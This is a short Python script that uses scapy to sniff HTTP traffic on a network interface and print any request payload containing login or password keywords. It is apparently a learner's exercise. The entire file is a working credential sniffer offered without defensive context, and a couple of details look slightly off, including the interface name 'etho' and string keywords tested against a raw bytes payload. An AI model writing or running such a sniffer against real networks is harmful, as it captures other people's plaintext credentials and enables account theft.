import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    #prn is a callback function method just give it a function name and it will automatically parse the packet in the function
    scapy.sniff(iface= interface, store= False, prn= sniffed_packet)

def sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            # print(packet[scapy.Raw].load)
            # print(packet.show())
            load = packet[scapy.Raw].load
            keys = ['username', "user", "login", "password", "pass"]
            for keyword in keys:
                if keyword in load:
                    print(load)

sniff("etho")